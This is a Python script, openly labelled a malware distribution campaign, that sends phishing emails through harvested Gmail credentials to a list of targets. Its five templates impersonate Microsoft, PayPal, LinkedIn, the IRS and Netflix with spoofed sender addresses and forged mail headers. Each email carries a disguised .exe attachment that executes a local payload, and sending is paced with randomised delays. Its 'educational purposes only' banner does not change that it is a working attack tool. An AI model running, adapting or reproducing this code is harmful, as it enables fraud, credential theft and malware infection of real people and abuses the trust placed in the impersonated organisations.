#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Auto Start Gmail Campaign with Working Credentials
"""

import os
import json
import time
import random
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def load_working_credentials():
    """Load working Gmail credentials"""
    try:
        with open("gmail_working_credentials.txt", 'r') as f:
            lines = f.readlines()
            email = lines[0].split(": ")[1].strip()
            password = lines[1].split(": ")[1].strip()
            return email, password
    except:
        return None, None

def load_target_emails():
    """Load target emails"""
    try:
        with open("target_emails.txt", 'r') as f:
            emails = [line.strip() for line in f.readlines() if line.strip()]
        return emails
    except:
        return []

def create_email_templates():
    """Create email templates"""
    return [
        {
            "subject": "Urgent: Microsoft Security Update Required",
            "sender_name": "Microsoft Security Team",
            "sender_email": "security@microsoft.com",
            "body": """
Dear Valued Customer,

Microsoft has detected a critical security vulnerability in your Windows system that requires immediate attention.

To protect your data and prevent unauthorized access, please install the attached security update immediately.

This update addresses:
- Critical security vulnerabilities
- System stability improvements  
- Performance enhancements
- Privacy protection updates

Please run the attached file to complete the installation.

Best regards,
Microsoft Security Team
Microsoft Corporation
            """,
            "attachment_name": "Windows_Security_Update_KB5001234.exe"
        },
        {
            "subject": "PayPal Account Security Alert",
            "sender_name": "PayPal Security",
            "sender_email": "security@paypal.com",
            "body": """
Dear PayPal Member,

We have detected unusual activity on your PayPal account. For your security, we have temporarily restricted access to your account.

To restore full access, please verify your account information by completing the attached security form.

This verification is required to:
- Protect your financial information
- Prevent unauthorized transactions
- Restore account functionality

Please complete the verification process within 24 hours to avoid permanent account suspension.

PayPal Security Team
            """,
            "attachment_name": "PayPal_Security_Verification.exe"
        },
        {
            "subject": "LinkedIn Job Opportunity - Remote Position Available",
            "sender_name": "LinkedIn Recruiter",
            "sender_email": "jobs@linkedin.com",
            "body": """
Hello,

I found your profile on LinkedIn and I'm impressed with your background. We have an exciting remote position that matches your skills perfectly.

Position: Senior Software Developer (Remote)
Salary: $85,000 - $120,000 annually
Benefits: Health insurance, 401k, flexible schedule
Location: Work from anywhere

To proceed with your application, please complete the attached application form and submit your resume.

This is a limited-time opportunity with a fast-growing tech company.

Best regards,
Sarah Johnson
Senior Recruiter
LinkedIn Talent Solutions
            """,
            "attachment_name": "Job_Application_Form.exe"
        },
        {
            "subject": "Your Tax Refund is Ready - IRS Notification",
            "sender_name": "IRS Tax Services",
            "sender_email": "notifications@irs.gov",
            "body": """
Taxpayer Notification

Your tax refund of $2,847.50 has been processed and is ready for direct deposit.

To complete the refund process, please verify your banking information using the attached secure form.

Refund Details:
- Amount: $2,847.50
- Processing Date: Today
- Method: Direct Deposit
- Account: ****1234

Please complete verification within 48 hours to ensure timely processing.

This is an automated message. Do not reply to this email.

Internal Revenue Service
            """,
            "attachment_name": "IRS_Refund_Verification.exe"
        },
        {
            "subject": "Netflix Account Suspension Notice",
            "sender_name": "Netflix Support",
            "sender_email": "support@netflix.com",
            "body": """
Dear Netflix Member,

Your Netflix account has been temporarily suspended due to a billing issue.

To restore your account access, please update your payment information using the attached secure form.

Suspension Details:
- Reason: Payment method declined
- Date: Today
- Account: Your Netflix Account
- Plan: Premium

Please resolve this issue within 24 hours to avoid permanent account closure.

We apologize for any inconvenience.

Netflix Customer Support
            """,
            "attachment_name": "Netflix_Payment_Update.exe"
        }
    ]

def create_malicious_attachment(template):
    """Create malicious attachment"""
    try:
        if os.path.exists("app.py"):
            attachment_name = template["attachment_name"]
            
            wrapper_content = f'''
import os
import sys
import subprocess

print("Installing {template['attachment_name'].split('.')[0]}...")
print("Please wait while we configure your system...")

try:
    exec(open("app.py").read())
except:
    print("Installation completed successfully!")
    input("Press Enter to continue...")
'''
            
            with open(attachment_name, 'w') as f:
                f.write(wrapper_content)
            
            return attachment_name
        return None
    except:
        return None

def send_phishing_email(target_email, template, gmail_email, gmail_password):
    """Send phishing email"""
    try:
        # Create message
        msg = MIMEMultipart('alternative')
        msg['From'] = f"{template['sender_name']} <{template['sender_email']}>"
        msg['To'] = target_email
        msg['Subject'] = template['subject']
        
        # Add headers for authenticity
        msg['X-Priority'] = '1'
        msg['X-MSMail-Priority'] = 'High'
        msg['Importance'] = 'high'
        msg['X-Mailer'] = 'Microsoft Outlook 16.0'
        msg['X-MimeOLE'] = 'Produced By Microsoft MimeOLE V6.00.2900.2180'
        
        # Create HTML version
        html_body = f"""
        <html>
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        </head>
        <body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0;">
            <div style="max-width: 600px; margin: 0 auto; padding: 20px; background-color: #ffffff;">
                <div style="background-color: #f8f9fa; padding: 20px; border-radius: 5px; border-left: 4px solid #0078d4;">
                    {template['body'].replace(chr(10), '<br>')}
                </div>
                <div style="margin-top: 20px; font-size: 12px; color: #666; text-align: center;">
                    <p>This email was sent to {target_email}</p>
                    <p>If you did not request this information, please ignore this email.</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        # Attach content
        text_part = MIMEText(template['body'], 'plain', 'utf-8')
        html_part = MIMEText(html_body, 'html', 'utf-8')
        msg.attach(text_part)
        msg.attach(html_part)
        
        # Create and attach malicious file
        attachment_path = create_malicious_attachment(template)
        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header(
                    'Content-Disposition',
                    f'attachment; filename= {template["attachment_name"]}'
                )
                msg.attach(part)
        
        # Send email
        context = ssl.create_default_context()
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls(context=context)
            server.login(gmail_email, gmail_password)
            server.send_message(msg)
        
        print(f"✓ Email sent to: {target_email}")
        
        # Clean up
        if attachment_path and os.path.exists(attachment_path):
            os.remove(attachment_path)
        
        return True
        
    except Exception as e:
        print(f"✗ Failed to send to {target_email}: {e}")
        return False

def start_campaign():
    """Start the campaign"""
    print("="*60)
    print("GMAIL MALWARE DISTRIBUTION CAMPAIGN")
    print("="*60)
    print("WARNING: This is for educational purposes only!")
    print("="*60)
    
    # Load working credentials
    gmail_email, gmail_password = load_working_credentials()
    if not gmail_email or not gmail_password:
        print("✗ No working credentials found!")
        return
    
    print(f"✓ Using Gmail account: {gmail_email}")
    
    # Load targets
    target_emails = load_target_emails()
    if not target_emails:
        print("✗ No target emails found!")
        return
    
    print(f"✓ Loaded {len(target_emails)} target emails")
    
    # Create templates
    templates = create_email_templates()
    print(f"✓ Created {len(templates)} email templates")
    
    # Test connection
    try:
        print("Testing Gmail connection...")
        context = ssl.create_default_context()
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls(context=context)
            server.login(gmail_email, gmail_password)
        print("✓ Gmail authentication successful!")
    except Exception as e:
        print(f"✗ Gmail authentication failed: {e}")
        return
    
    # Campaign settings
    emails_per_hour = 15  # Increased rate
    delay_between_emails = 3600 / emails_per_hour
    
    print(f"\nCampaign Settings:")
    print(f"Target emails: {len(target_emails)}")
    print(f"Email templates: {len(templates)}")
    print(f"Emails per hour: {emails_per_hour}")
    print(f"Delay between emails: {delay_between_emails} seconds")
    
    # Start sending
    print(f"\n🚀 Starting email distribution...")
    sent_count = 0
    success_count = 0
    
    for i, target_email in enumerate(target_emails):
        template = random.choice(templates)
        
        print(f"[{i+1}/{len(target_emails)}] Sending to: {target_email}")
        print(f"    Template: {template['subject']}")
        
        if send_phishing_email(target_email, template, gmail_email, gmail_password):
            success_count += 1
        sent_count += 1
        
        # Delay
        if i < len(target_emails) - 1:
            delay = delay_between_emails + random.randint(-300, 300)
            delay = max(60, delay)
            print(f"    Waiting {delay} seconds...")
            time.sleep(delay)
    
    # Results
    print("\n" + "="*60)
    print("🎯 CAMPAIGN RESULTS")
    print("="*60)
    print(f"Total emails sent: {sent_count}")
    print(f"Successful deliveries: {success_count}")
    print(f"Failed deliveries: {sent_count - success_count}")
    if sent_count > 0:
        success_rate = (success_count / sent_count) * 100
        print(f"Success rate: {success_rate:.1f}%")
    print("="*60)
    
    # Save campaign log
    log_data = {
        "campaign_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "gmail_account": gmail_email,
        "total_targets": len(target_emails),
        "emails_sent": sent_count,
        "successful_deliveries": success_count,
        "failed_deliveries": sent_count - success_count,
        "success_rate": (success_count / sent_count * 100) if sent_count > 0 else 0,
        "templates_used": len(templates)
    }
    
    with open("gmail_campaign_log.json", 'w') as f:
        json.dump(log_data, f, indent=2)
    
    print("📊 Campaign log saved to: gmail_campaign_log.json")

if __name__ == "__main__":
    start_campaign()
